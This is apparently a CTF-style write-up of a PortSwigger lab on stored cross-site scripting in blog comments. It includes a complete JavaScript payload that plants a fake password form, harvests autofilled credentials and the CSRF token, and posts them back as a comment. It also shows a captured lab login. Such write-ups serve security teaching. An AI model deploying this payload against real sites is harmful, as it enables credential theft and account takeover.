---
title: "xss 15 - portswigger labs"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "csrf", "web-exploitation", "xss-15", "portswigger-labs"]
summary: "web writeup for \"xss 15\" from portswigger labs - techniques: xss, csrf, web-exploitation, xss-15, portswigger-labs."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-15/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Cross-Site-Scripting/xss-15/README.md"
ctf:
  name: "portswigger labs"
  challenge: "xss 15"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** xss 15
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-15/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Cross-Site-Scripting/xss-15/README.md>

---
# Exploiting cross-site scripting to capture passwords | Dec 31, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords), you'll learn: Exploiting cross-site scripting to capture passwords! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231044403.png)

**In the home page, we can view one of those posts:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231044550.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231044555.png)

And we can leave some comments.

**Let's test for XSS:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231044704.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231044713.png)

It worked!

Now, **we can create a fake password `<input>` box, to capture victim auto-filled password!**

```html
<h2>Type your password here:</h2>

<form onchange=getPassword()>
    <label for="passwd">Password:</label>
    <input type="password" id="passwd" name="password">
    <br>
    <label for="user">Username:</label>
    <input type="username" id="user" name="username">
</form>

<script>
    function getPassword(){
        // Capture victim's password and CSRF token
        var password = document.getElementsByName("password")[0].value;
        var username = document.getElementsByName("username")[0].value;
        var csrfToken = document.getElementsByName('csrf')[0].value;

        // Construct the require POST parameters
        var data = 'csrf=' + csrfToken + '&';
        data += 'postId=7&';
        data += 'comment=' + username + ':' + password + '&';
        data += 'name=XSS&';
        data += 'email=xss@xss.com&';
        data += 'website='

        // Send the victim's password and username
        fetch('https://0a3c00d703b03f0fc0723608004700ed.web-security-academy.net/post/comment',
            {
                method: 'POST',
                mode: 'no-cors',
                body: data
            }
        )
    };
</script>
```

In this payload, when one of the input boxes update, run function `getPassword()`, which will fetch victim's password, username, and CSRF token. Then, construct the require POST parameters and send it via POST requesto to `/post/comment`.

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231053257.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231053307.png)

**Boom! We got his username and password: `administrator:4p7u96l7v47i93hx76qq`.**

**Let's login as `administrator`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231053341.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Cross-Site-Scripting/XSS-15/images/Pasted%20image%2020221231053350.png)

I'm user `administrator`!

# What we've learned:

1. Exploiting cross-site scripting to capture passwords
